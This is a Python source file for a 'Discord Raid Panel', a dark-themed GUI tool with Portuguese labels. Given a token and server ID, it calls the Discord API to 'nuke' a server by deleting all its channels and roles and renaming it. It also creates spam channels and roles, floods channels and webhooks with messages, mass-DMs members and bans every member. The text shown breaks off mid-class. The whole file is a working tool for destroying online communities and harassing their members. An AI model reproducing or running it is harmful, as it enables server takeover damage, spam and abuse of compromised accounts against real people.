# discord_raid_panel.py
# Target: Discord API v10 | Python 3.11+ | Windows / Linux
# UI: CustomTkinter dark | Backend: aiohttp async + threading bridge

import customtkinter as ctk
import asyncio
import aiohttp
import threading
import random
import string
import time
from datetime import datetime
from typing import Optional

# ─────────────────────────────────────────────
#  COLOUR PALETTE
# ─────────────────────────────────────────────
BG       = "#0d0d0f"
PANEL    = "#13131a"
CARD     = "#1a1a24"
ACCENT   = "#7c3aed"
ACCENT2  = "#a855f7"
RED      = "#ef4444"
GREEN    = "#22c55e"
YELLOW   = "#eab308"
TEXT     = "#e2e8f0"
MUTED    = "#64748b"
BORDER   = "#2d2d3d"

# ─────────────────────────────────────────────
#  RAID CORE
# ─────────────────────────────────────────────
class RaidCore:
    BASE = "https://discord.com/api/v10"

    def __init__(self, token: str, guild_id: str, log_cb, threads: int = 5):
        self.token    = token
        self.guild_id = guild_id
        self.log      = log_cb
        self.threads  = threads
        self.running  = False
        self.session: Optional[aiohttp.ClientSession] = None

    def _headers(self) -> dict:
        return {
            "Authorization": self.token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }

    async def _get(self, path: str):
        async with self.session.get(f"{self.BASE}{path}", headers=self._headers()) as r:
            if r.status == 200:
                return await r.json()
            self.log(f"[GET {r.status}] {path}", "warn")
            return None

    async def _post(self, path: str, payload: dict = {}):
        async with self.session.post(
            f"{self.BASE}{path}", headers=self._headers(), json=payload
        ) as r:
            return r.status, await r.text()

    async def _delete(self, path: str):
        async with self.session.delete(
            f"{self.BASE}{path}", headers=self._headers()
        ) as r:
            return r.status

    async def _patch(self, path: str, payload: dict):
        async with self.session.patch(
            f"{self.BASE}{path}", headers=self._headers(), json=payload
        ) as r:
            return r.status

    # ── validate token / guild ──────────────────
    async def validate(self) -> tuple[bool, str]:
        async with aiohttp.ClientSession() as s:
            self.session = s
            me = await self._get("/users/@me")
            if not me:
                return False, "token inválido ou sem acesso"
            guild = await self._get(f"/guilds/{self.guild_id}")
            if not guild:
                return False, f"guild {self.guild_id} não encontrada / sem permissão"
            return True, f"ok — {me.get('username')}#{me.get('discriminator')} | {guild.get('name')}"

    # ── fetch helpers ───────────────────────────
    async def _channels(self):
        return await self._get(f"/guilds/{self.guild_id}/channels") or []

    async def _roles(self):
        return await self._get(f"/guilds/{self.guild_id}/roles") or []

    async def _members(self, limit: int = 1000):
        return await self._get(
            f"/guilds/{self.guild_id}/members?limit={limit}"
        ) or []

    # ── nuke ────────────────────────────────────
    async def nuke(self, spam_name: str = "raided", channel_count: int = 20):
        self.log("NUKE iniciado", "action")
        channels = await self._channels()
        roles    = await self._roles()

        # delete channels
        for ch in channels:
            if not self.running: break
            s = await self._delete(f"/channels/{ch['id']}")
            self.log(f"  canal deletado #{ch.get('name')} [{s}]", "ok" if s in (200, 204) else "warn")
            await asyncio.sleep(0.35)

        # delete roles (skip @everyone)
        for r in roles:
            if not self.running: break
            if r["id"] == self.guild_id: continue
            s = await self._delete(f"/guilds/{self.guild_id}/roles/{r['id']}")
            self.log(f"  role deletada @{r.get('name')} [{s}]", "ok" if s in (200, 204) else "warn")
            await asyncio.sleep(0.35)

        # rename server
        await self._patch(f"/guilds/{self.guild_id}", {"name": spam_name})
        self.log(f"  servidor renomeado → {spam_name}", "ok")

        # create spam channels
        tasks = []
        for i in range(channel_count):
            tasks.append(self._post(
                f"/guilds/{self.guild_id}/channels",
                {"name": spam_name, "type": 0}
            ))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ok = sum(1 for r in results if isinstance(r, tuple) and r[0] == 201)
        self.log(f"  {ok}/{channel_count} canais de spam criados", "ok")

        # spam in new channels
        new_channels = await self._channels()
        spam_tasks = []
        for ch in new_channels[:channel_count]:
            for _ in range(5):
                spam_tasks.append(self._post(
                    f"/channels/{ch['id']}/messages",
                    {"content": spam_name * 10}
                ))
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        self.log("NUKE completo", "ok")

    # ── spam messages ────────────────────────────
    async def spam(self, message: str, rounds: int = 50):
        self.log("SPAM iniciado", "action")
        channels = [c for c in await self._channels() if c.get("type") == 0]
        if not channels:
            self.log("nenhum canal de texto encontrado", "warn")
            return
        sent = 0
        for _ in range(rounds):
            if not self.running: break
            tasks = [
                self._post(f"/channels/{ch['id']}/messages", {"content": message})
                for ch in channels
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            sent += sum(1 for r in results if isinstance(r, tuple) and r[0] == 200)
            await asyncio.sleep(0.5)
        self.log(f"SPAM completo — {sent} mensagens", "ok")

    # ── mass DM ─────────────────────────────────
    async def mass_dm(self, message: str):
        self.log("MASS DM iniciado", "action")
        members = await self._members()
        sent = 0
        for m in members:
            if not self.running: break
            uid = m.get("user", {}).get("id")
            if not uid: continue
            s, _ = await self._post(f"/users/@me/channels", {"recipient_id": uid})
            if s == 200:
                dm_data = await self._get(f"/users/@me/channels")
                # quick approach — open DM then send
                chan_r, chan_t = await self._post("/users/@me/channels", {"recipient_id": uid})
            # direct channel create + message
            async with self.session.post(
                f"{self.BASE}/users/@me/channels",
                headers=self._headers(), json={"recipient_id": uid}
            ) as r:
                if r.status == 200:
                    ch = await r.json()
                    ms, _ = await self._post(f"/channels/{ch['id']}/messages", {"content": message})
                    if ms == 200:
                        sent += 1
            await asyncio.sleep(1.2)  # avoid DM rate-limit ban
        self.log(f"MASS DM completo — {sent} enviadas", "ok")

    # ── mass ban ─────────────────────────────────
    async def mass_ban(self):
        self.log("MASS BAN iniciado", "action")
        members = await self._members()
        banned = 0
        for m in members:
            if not self.running: break
            uid = m.get("user", {}).get("id")
            if not uid: continue
            s = await self._delete(f"/guilds/{self.guild_id}/bans/{uid}")
            # PUT ban
            async with self.session.put(
                f"{self.BASE}/guilds/{self.guild_id}/bans/{uid}",
                headers=self._headers(), json={"delete_message_days": 7}
            ) as r:
                if r.status in (200, 204):
                    banned += 1
            await asyncio.sleep(0.4)
        self.log(f"MASS BAN completo — {banned} banidos", "ok")

    # ── mass roles ───────────────────────────────
    async def mass_roles(self, name: str = "raided", count: int = 30):
        self.log("MASS ROLES iniciado", "action")
        tasks = [
            self._post(
                f"/guilds/{self.guild_id}/roles",
                {"name": name, "color": random.randint(0, 0xFFFFFF)}
            )
            for _ in range(count)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        ok = sum(1 for r in results if isinstance(r, tuple) and r[0] == 200)
        self.log(f"MASS ROLES completo — {ok}/{count} criadas", "ok")

    # ── webhook spam ─────────────────────────────
    async def webhook_spam(self, message: str, rounds: int = 100):
        self.log("WEBHOOK SPAM iniciado", "action")
        channels = [c for c in await self._channels() if c.get("type") == 0]
        hooks = []
        for ch in channels:
            data = await self._get(f"/channels/{ch['id']}/webhooks")
            if data:
                hooks.extend(data)
        if not hooks:
            # create one
            s, t = await self._post(f"/channels/{channels[0]['id']}/webhooks", {"name": "x"})
            if s == 200:
                import json
                hooks.append(json.loads(t))
        if not hooks:
            self.log("nenhum webhook disponível", "warn")
            return
        sent = 0
        for _ in range(rounds):
            if not self.running: break
            tasks = []
            for h in hooks:
                url = f"https://discord.com/api/webhooks/{h['id']}/{h['token']}"
                tasks.append(self.session.post(url, json={"content": message}))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if hasattr(r, "status") and r.status in (200, 204):
                    sent += 1
                    r.close()
            await asyncio.sleep(0.3)
        self.log(f"WEBHOOK SPAM completo — {sent} enviadas", "ok")

    # ── runner ────────────────────────────────────
    async def run_action(self, action: str, **kwargs):
        self.running = True
        async with aiohttp.ClientSession() as s:
            self.session = s
            try:
                if   action == "nuke":         await self.nuke(**kwargs)
                elif action == "spam":         await self.spam(**kwargs)
                elif action == "mass_dm":      await self.mass_dm(**kwargs)
                elif action == "mass_ban":     await self.mass_ban()
                elif action == "mass_roles":   await self.mass_roles(**kwargs)
                elif action == "webhook_spam": await self.webhook_spam(**kwargs)
            except Exception as e:
                self.log(f"[ERRO] {e}", "error")
        self.running = False


# ─────────────────────────────────────────────
#  GUI
# ─────────────────────────────────────────────
class RaidPanel(ctk.CTk):
    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.title("RAID PANEL")
        self.geometry("1100x720")
        self.resizable(False, False)
        self.configure(fg_color=BG)

        self.core: Optional[RaidCore] = None
        self._loop = asyncio.new_event_loop()
        self._thread = threading.Thread(target=self._loop.run_forever, daemon=True)
        self._thread.start()

        self._build_ui()

    # ── UI builder ───────────────────────────────
    def _build_ui(self):
        # ── header ──
        hdr = ctk.CTkFrame(self, fg_color=PANEL, corner_radius=0, height=56)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        ctk.CTkLabel(
            hdr, text="⚔  DISCORD RAID PANEL",
            font=("JetBrains Mono", 18, "bold"),
            text_color=ACCENT2
        ).pack(side="left", padx=24, pady=12)
        self._status_label = ctk.CTkLabel(
            hdr, text="● offline",
            font=("JetBrains Mono", 11),
            text_color=MUTED
        )
        self._status_label.pack(side="right", padx=24)

        # ── body ──
        body = ctk.CTkFrame(self, fg_color=BG)
        body.pack(fill="both", expand=True, padx=0, pady=0)

        # left column
        left = ctk.CTkFrame(body, fg_color=BG, width=340)
        left.pack(side="left", fill="y", padx=(16, 8), pady=16)
        left.pack_propagate(False)
        self._build_config(left)

        # right column
        right = ctk.CTkFrame(body, fg_color=BG)
        right.pack(side="left", fill="both", expand=True, padx=(8, 16), pady=16)
        self._build_actions(right)
        self._build_log(right)

    def _section(self, parent, label: str):
        f = ctk.CTkFrame(parent, fg_color=CARD, corner_radius=10)
        f.pack(fill="x", pady=(0, 12))
        ctk.CTkLabel(
            f, text=label,
            font=("JetBrains Mono", 11, "bold"),
            text_color=ACCENT2
        ).pack(anchor="w", padx=14, pady=(10, 2))
        return f

    def _field(self, parent, label: str, placeholder: str, show: str = ""):
        ctk.CTkLabel(
            parent, text=label,
            font=("JetBrains Mono", 10),
            text_color=MUTED
        ).pack(anchor="w", padx=14)
        e = ctk.CTkEntry(
            parent,
            placeholder_text=placeholder,
            font=("JetBrains Mono", 11),
            fg_color=PANEL,
            border_color=BORDER,
            text_color=TEXT,
            height=34,
            show=show
        )
        e.pack(fill="x", padx=14, pady=(2, 8))
        return e

    def _build_config(self, parent):
        # credentials
        sec = self._section(parent, "CREDENCIAIS")
        self._token = self._field(sec, "TOKEN", "Bot xxx... ou user token", show="•")
        self._guild  = self._field(sec, "GUILD ID", "123456789012345678")

        # validate
        ctk.CTkButton(
            sec,
            text="VALIDAR CONEXÃO",
            font=("JetBrains Mono", 11, "bold"),
            fg_color=ACCENT, hover_color=ACCENT2,
            height=36, corner_radius=6,
            command=self._validate
        ).pack(fill="x", padx=14, pady=(0, 12))

        # spam config
        sec2 = self._section(parent, "CONFIGURAÇÃO DE SPAM")
        self._spam_msg = self._field(sec2, "MENSAGEM", "@everyone raided")
        self._nuke_name = self._field(sec2, "NOME DO NUKE", "raided")

        ctk.CTkLabel(
            sec2, text="ROUNDS DE SPAM",
            font=("JetBrains Mono", 10), text_color=MUTED
        ).pack(anchor="w", padx=14)
        self._rounds = ctk.CTkSlider(
            sec2, from_=1, to=200, number_of_steps=199,
            fg_color=BORDER, progress_color=ACCENT, button_color=ACCENT2
        )
        self._rounds.set(50)
        self._rounds.pack(fill="x", padx=14, pady=(2, 4))
        self._rounds_lbl = ctk.CTkLabel(
            sec2, text="50 rounds",
            font=("JetBrains Mono", 10), text_color=MUTED
        )
        self._rounds_lbl.pack(anchor="e", padx=14, pady=(0, 8))
        self._rounds.configure(command=lambda v: self._rounds_lbl.configure(text=f"{int(v)} rounds"))

        ctk.CTkLabel(
            sec2, text="THREADS",
            font=("JetBrains Mono", 10), text_color=MUTED
        ).pack(anchor="w", padx=14)
        self._thread_count = ctk.CTkSlider(
            sec2, from_=1, to=20, number_of_steps=19,
            fg_color=BORDER, progress_color=ACCENT, button_color=ACCENT2
        )
        self._thread_count.set(5)
        self._thread_count.pack(fill="x", padx=14, pady=(2, 4))
        self._tc_lbl = ctk.CTkLabel(
            sec2, text="5 threads",
            font=("JetBrains Mono", 10), text_color=MUTED
        )
        self._tc_lbl.pack(anchor="e", padx=14, pady=(0, 12))
        self._thread_count.configure(command=lambda v: self._tc_lbl.configure(text=f"{int(v)} threads"))

        # stop
        ctk.CTkButton(
            parent,
            text="■  PARAR TUDO",
            font=("JetBrains Mono", 11, "bold"),
            fg_color=RED, hover_color="#b91c1c",
            height=40, corner_radius=6,
            command=self._stop
        ).pack(fill="x", pady=(4, 0))

    def _action_btn(self, parent, label: str, color: str, hover: str, cmd):
        ctk.CTkButton(
            parent,
            text=label,
            font=("JetBrains Mono", 11, "bold"),
            fg_color=color, hover_color=hover,
            height=42, corner_radius=6,
            command=cmd
        ).pack(fill="x", padx=4, pady=4)

    def _build_actions(self, parent):
        sec = ctk.CTkFrame(parent, fg_color=CARD, corner_radius=10)
        sec.pack(fill="x", pady=(0, 12))
        ctk.CTkLabel(
            sec, text="AÇÕES",
            font=("JetBrains Mono", 11, "bold"),
            text_color=ACCENT2
        ).pack(anchor="w", padx=14, pady=(10, 6))

        grid = ctk.CTkFrame(sec, fg_color=CARD)
        grid.pack(fill="x", padx=10, pady=(0, 12))

        col1 = ctk.CTkFrame(grid, fg_color=CARD)
        col1.pack(side="left", fill="both", expand=True)
        col2 = ctk.CTkFrame(grid, fg_color=CARD)
        col2.pack(side="left", fill="both", expand=True)

        self._action_btn(col1, "☢  NUKE SERVIDOR",   "#7f1d1d", "#991b1b", self._do_nuke)
        self._action_btn(col1, "💬  SPAM MENSAGENS",  ACCENT,    ACCENT2,  self._do_spam)
        self._action_btn(col1, "📨  MASS DM",         "#1e3a5f", "#1d4ed8", self._do_dm)
        self._action_btn(col2, "🔨  MASS BAN",        "#431407", "#c2410c", self._do_ban)
        self._action_btn(col2, "🏷  MASS ROLES",      "#2d1b69", "#6d28d9", self._do_roles)
        self._action_btn(col2, "🪝  WEBHOOK SPAM",    "#064e3b", "#059669", self._do_webhook)

    def _build_log(self, parent):
        sec = ctk.CTkFrame(parent, fg_color=CARD, corner_radius=10)
        sec.pack(fill="both", expand=True)
        ctk.CTkLabel(
            sec, text="LOG",
            font=("JetBrains Mono", 11, "bold"),
            text_color=ACCENT2
        ).pack(anchor="w", padx=14, pady=(10, 4))
        self._log_box = ctk.CTkTextbox(
            sec,
            font=("JetBrains Mono", 10),
            fg_color=PANEL,
            text_color=TEXT,
            border_color=BORDER,
            corner_radius=6,
            state="disabled"
        )
        self._log_box.pack(fill="both", expand=True, padx=12, pady=(0, 12))

    # ── log ──────────────────────────────────────
    def _ts(self):
        return datetime.now().strftime("%H:%M:%S")

    def log(self, msg: str, kind: str = "info"):
        color_map = {
            "ok":     GREEN,
            "warn":   YELLOW,
            "error":  RED,
            "action": ACCENT2,
            "info":   TEXT
        }
        prefix_map = {
            "ok": "✓", "warn": "⚠", "error": "✗", "action": "»", "info": "·"
        }
        line = f"[{self._ts()}] {prefix_map.get(kind, '·')} {msg}\n"
        self._log_box.configure(state="normal")
        self._log_box.insert("end", line)
        self._log_box.see("end")
        self._log_box.configure(state="disabled")

    # ── helpers ──────────────────────────────────
    def _get_core(self) -> Optional[RaidCore]:
        token = self._token.get().strip()
        guild = self._guild.get().strip()
        if not token or not guild:
            self.log("token e guild id são obrigatórios", "error")
            return None
        return RaidCore(
            token, guild,
            log_cb=self.log,
            threads=int(self._thread_count.get())
        )

    def _run_async(self, coro):
        asyncio.run_coroutine_threadsafe(coro, self._loop)

    def _stop(self):
        if self.core:
            self.core.running = False
            self.log("operação interrompida", "warn")
        self._status_label.configure(text="● parado", text_color=RED)

    # ── validate ─────────────────────────────────
    